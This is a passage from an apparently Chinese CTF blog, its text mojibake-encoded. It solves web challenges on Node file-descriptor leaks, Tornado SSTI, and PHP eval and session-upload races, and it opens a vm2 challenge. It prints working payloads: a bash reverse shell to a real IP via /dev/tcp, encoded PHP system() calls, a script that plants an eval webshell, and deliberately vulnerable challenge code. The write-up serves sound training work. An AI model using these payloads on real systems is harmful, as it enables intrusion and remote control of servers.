class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(flag.<span class="title function_">toString</span>().<span class="title function_">slice</span>(<span class="number">0</span>, <span class="title function_">randomBytes</span>(<span class="number">1</span>)[<span class="number">0</span>]%<span class="number">32</span>));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// éšæœºæ•°é¢„æµ‹æˆ–è€…ä¸€å¤©ä¹‹å</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">        <span class="keyword">if</span> (a === <span class="title function_">randomBytes</span>(<span class="number">3</span>).<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">            &#125;, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)?<span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">86400</span>*<span class="number">1000</span>, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)):<span class="number">86400</span>*<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å…³é”®ç‚¹åœ¨&#x2F;getflagï¼Œå®ƒå¯ä»¥å‘é€è¯·æ±‚ã€‚</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶ï¼Œæˆ‘ä»¬æ³¨æ„çœ‹è¿™é‡Œ</p>
<p>&#x2F;app&#x2F;src&#x2F;flag.txt æ–‡ä»¶è¢« open() æ‰“å¼€ï¼Œä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ï¼Œè™½ç„¶åˆ é™¤äº†è¯¥æ–‡ä»¶ï¼Œä½†åœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚&#x2F;proc&#x2F;self&#x2F;fd è¿™ä¸ªç›®å½•é‡ŒåŒ…å«äº†è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µï¼Œç›®å½•é‡Œé¢æœ‰ä¸€å †&#x2F;proc&#x2F;self&#x2F;fd&#x2F;idæ–‡ä»¶ï¼Œidå°±æ˜¯è¿›ç¨‹è®°å½•çš„æ‰“å¼€æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦çš„åºå·ã€‚idå¯çˆ†ç ´çŒœæµ‹è·å¾—ã€‚</p>
<p>setTimeoutæ˜¯ä½¿ç”¨Int32æ¥å­˜å‚¨å»¶æ—¶å‚æ•°å€¼çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€å¤§çš„å»¶æ—¶å€¼æ˜¯2^31-1ã€‚ ä¸€æ—¦è¶…è¿‡äº†æœ€å¤§å€¼ï¼Œå…¶æ•ˆæœå°±è·Ÿå»¶æ—¶å€¼ä¸º0çš„æƒ…å†µä¸€æ ·ã€‚æ•°ä¸º 2147483648ï¼Œå³å¯å®ç°å»¶æ—¶ä¸º0ã€‚</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130449675.png" alt="image-20241223130449675"></p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130528458.png" alt="image-20241223130528458"></p>
<h2 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="variable language_">self</span>.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="variable language_">self</span>.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        <span class="subst">&#123;data&#125;</span></span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            <span class="variable language_">self</span>.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>

<p>ä¸å½±å“è¯»æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;% extends /etc/passwd %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223165932556.png" alt="image-20241223165932556"></p>
<p>è¿™é‡Œåº”è¯¥ç›´æ¥éé¢„æœŸäº†ï¼</p>
<p>æ­£å¸¸æ¥åšï¼Œè¿‡æ»¤äº†æ‹¬å·å¼•å·å•¥çš„ï¼Œç¬”è®°äº†è§£ä¸€ä¸‹</p>
<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223170940953.png" alt="image-20241223170940953"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssti=&#123;%set _tt_utf8=eval%&#125;&#123;%raw request.body_arguments[request.method][0]%&#125;&amp;POST=__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/156.238.233.113/4567 &lt;%261&#x27;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223171201655.png" alt="image-20241223171201655"></p>
<p>é¢ï¼Œè™½ç„¶æœ€åä¹Ÿæ˜¯åœ¨ç¯å¢ƒå˜é‡é‡Œæ‰¾åˆ°flagçš„ã€‚ã€‚ã€‚</p>
<h2 id="ç¬¬äº”ç©ºé—´-2021-EasyCleanup"><a href="#ç¬¬äº”ç©ºé—´-2021-EasyCleanup" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup"></a>[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•çœ‹ä¸Šå»æ˜¯æœ‰ä¸¤ç§çš„ï¼Œä¸€ç§æ˜¯æƒ³åŠæ³•rceï¼Œä¸€ç§æ˜¯includeæ¥è¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<p>æ–¹æ³•ä¸€RCEï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%93%8C%DF%D0);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172100977.png" alt="image-20241223172100977"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /*</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mode=eval&amp;shell=system(~%91%93%DF%D0%D5);</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172424946.png" alt="image-20241223172424946"></p>
<p>æ–¹æ³•äºŒï¼šsessionæ¡ä»¶ç«äº‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28547/&#x27;</span></span><br><span class="line">sessionid = <span class="string">&#x27;met&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>): <span class="comment"># å†™å…¥ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>) <span class="comment"># 50kb</span></span><br><span class="line">        session.post(url, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessionid&#125;, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php file_put_contents(&#x27;/var/www/html/shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);?&gt;&quot;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;1.jpg&#x27;</span>, fileBytes)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.get(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid) <span class="comment"># è¿›è¡Œæ–‡ä»¶åŒ…å«</span></span><br><span class="line">        r = session.get(url+<span class="string">&#x27;shell.php&#x27;</span>) <span class="comment"># æ£€æŸ¥æ˜¯å¦å†™å…¥ä¸€å¥è¯æœ¨é©¬</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;OK&#x27;</span>)</span><br><span class="line"></span><br><span class="line">evnet = threading.Event() <span class="comment"># å¤šçº¿ç¨‹</span></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">evnet.<span class="built_in">set</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ²¡æˆåŠŸï¼Ÿï¼å¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜å§æˆ‘è§‰å¾—ã€‚ã€‚ã€‚</p>
<h2 id="HZNUCTF-2023-final-eznode"><a href="#HZNUCTF-2023-final-eznode" class="headerlink" title="[HZNUCTF 2023 final]eznode"></a>[HZNUCTF 2023 final]eznode</h2><p>æ‰“å¼€è®©æˆ‘ä»¬æ‰¾æºç ï¼Œæ‰«ä¸ªç›®å½•çœ‹çœ‹</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸ªvm2å•Šï¼Œå¯èƒ½è·Ÿvm2çš„æ²™ç®±é€ƒé€¸æœ‰å…³ï¼</p>
